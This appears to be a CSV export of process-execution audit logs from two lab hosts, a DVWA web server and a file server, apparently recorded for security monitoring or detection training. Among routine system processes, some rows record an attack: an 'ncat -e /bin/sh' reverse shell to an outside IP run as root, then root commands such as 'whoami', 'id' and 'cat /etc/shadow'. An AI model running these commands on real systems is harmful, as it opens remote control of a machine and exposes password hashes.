@timestamp,agent.hostname,command,cwd,event.ingested,filename,host.hostname,host.id,host.ip,host.mac,host.name,host.os.codename,host.os.family,host.os.kernel,host.os.name,host.os.type,host.os.version,message,sid,tty,uid
"Oct 24, 2022 @ 23:30:11.036",dvwa_web,/usr/sbin/exim4 -Mc 1omzOr-0014mf-OQ,/var/spool/exim4,"Oct 24, 2022 @ 23:30:12.038",/usr/sbin/exim4,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:105 sid:256722 tty:(none) cwd:/var/spool/exim4 filename:/usr/sbin/exim4]: /usr/sbin/exim4 -Mc 1omzOr-0014mf-OQ,256722,(none),105
"Oct 24, 2022 @ 23:30:11.036",dvwa_web,/usr/sbin/sshd -R,/,"Oct 24, 2022 @ 23:30:12.038",/usr/sbin/sshd,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:0 sid:256729 tty:(none) cwd:/ filename:/usr/sbin/sshd]: /usr/sbin/sshd -R,256729,(none),0
"Oct 24, 2022 @ 23:30:11.036",dvwa_web,/usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d,/,"Oct 24, 2022 @ 23:30:12.038",/usr/bin/env,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:0 sid:256729 tty:(none) cwd:/ filename:/usr/bin/env]: /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d,256729,(none),0
"Oct 24, 2022 @ 23:30:11.036",dvwa_web,/etc/update-motd.d/10-uname,/,"Oct 24, 2022 @ 23:30:12.038",/etc/update-motd.d/10-uname,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:0 sid:256729 tty:(none) cwd:/ filename:/etc/update-motd.d/10-uname]: /etc/update-motd.d/10-uname,256729,(none),0
"Oct 24, 2022 @ 23:30:11.036",dvwa_web,uname -snrvm,/,"Oct 24, 2022 @ 23:30:12.038",/bin/uname,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:0 sid:256729 tty:(none) cwd:/ filename:/bin/uname]: uname -snrvm,256729,(none),0
"Oct 24, 2022 @ 23:30:11.035",dvwa_web,ncat -e /bin/sh 123.123.123.250 9002,/root,"Oct 24, 2022 @ 23:30:12.038",/usr/bin/ncat,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:0 sid:256719 tty:(none) cwd:/root filename:/usr/bin/ncat]: ncat -e /bin/sh 123.123.123.250 9002,256719,(none),0
"Oct 24, 2022 @ 23:29:28.566",fileserver,cat /etc/shadow,/tmp,"Oct 24, 2022 @ 23:29:29.568",/bin/cat,fileserver,40beb5eb909e171860ceee669da56e1d,10.10.10.30,02:42:0a:0a:0a:1e,fileserver,jessie,debian,5.15.0-52-generic,Debian GNU/Linux,linux,8 (jessie),[uid:0 sid:1 tty:(none) cwd:/tmp filename:/bin/cat]: cat /etc/shadow,1,(none),0
"Oct 24, 2022 @ 23:29:22.563",fileserver,/bin/sh,/tmp,"Oct 24, 2022 @ 23:29:23.564",/bin/sh,fileserver,40beb5eb909e171860ceee669da56e1d,10.10.10.30,02:42:0a:0a:0a:1e,fileserver,jessie,debian,5.15.0-52-generic,Debian GNU/Linux,linux,8 (jessie),[uid:0 sid:1 tty:(none) cwd:/tmp filename:/bin/sh]: /bin/sh,1,(none),0
"Oct 24, 2022 @ 23:29:22.563",fileserver,whoami,/tmp,"Oct 24, 2022 @ 23:29:23.564",/usr/bin/whoami,fileserver,40beb5eb909e171860ceee669da56e1d,10.10.10.30,02:42:0a:0a:0a:1e,fileserver,jessie,debian,5.15.0-52-generic,Debian GNU/Linux,linux,8 (jessie),[uid:0 sid:1 tty:(none) cwd:/tmp filename:/usr/bin/whoami]: whoami,1,(none),0
"Oct 24, 2022 @ 23:29:22.563",fileserver,id,/tmp,"Oct 24, 2022 @ 23:29:23.564",/usr/bin/id,fileserver,40beb5eb909e171860ceee669da56e1d,10.10.10.30,02:42:0a:0a:0a:1e,fileserver,jessie,debian,5.15.0-52-generic,Debian GNU/Linux,linux,8 (jessie),[uid:0 sid:1 tty:(none) cwd:/tmp filename:/usr/bin/id]: id,1,(none),0
